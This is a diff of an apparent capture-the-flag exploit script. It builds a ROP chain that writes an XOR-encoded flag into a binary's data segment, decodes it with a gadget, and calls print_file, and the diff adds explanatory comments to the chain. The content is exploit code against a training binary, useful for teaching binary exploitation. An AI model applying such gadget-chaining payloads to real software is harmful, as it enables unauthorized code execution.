@@ -18,7 +18,7 @@ def xor_flag(flag):
     return "".join(flag_list)
 
 
-def write_flag_string_in_segment():
+def write_xored_flag_string_in_segment():
     global data_segment, payload
     padding = "\x90"*40
 
@@ -30,18 +30,19 @@ def write_flag_string_in_segment():
     payload += pop_r12_r13_r14_r15
     payload += xored_flag
     payload += p64(data_segment)
-    payload += "\x00\x00\x00\x00\x00\x00\x00\x00"
-    payload += "\x00\x00\x00\x00\x00\x00\x00\x00"
-    payload += mov_r13_r12
+    payload += "\x00\x00\x00\x00\x00\x00\x00\x00" # to complete r14 with null bytes
+    payload += "\x00\x00\x00\x00\x00\x00\x00\x00" # to complete r15 with null bytes
+    payload += mov_r13_r12 # to put xored flag in data segment
 
 
 def unxor_flag_string_in_segment():
     global data_segment, pop_r14_r15, payload 
     xor_byte_ptr_r15_r14 = p64(0x400628)
 
+    # to unXOR each chars
     for i in range(8):
-        payload += pop_r14_r15
-        payload += p64(0x2)
+        payload += pop_r14_r15 # to setup XOR key in r14 & data_segment in r15
+        payload += p64(0x2) # XOR key
         payload += p64(data_segment + i)
         payload += xor_byte_ptr_r15_r14
 
@@ -55,7 +56,7 @@ def print_flag_via_print_file():
     payload += p64(data_segment)
     payload += print_file_subroutine
 
-write_flag_string_in_segment(), unxor_flag_string_in_segment(), print_flag_via_print_file()
+write_xored_flag_string_in_segment(), unxor_flag_string_in_segment(), print_flag_via_print_file()
 
 p.recvuntil("> ")
 p.sendline(payload)
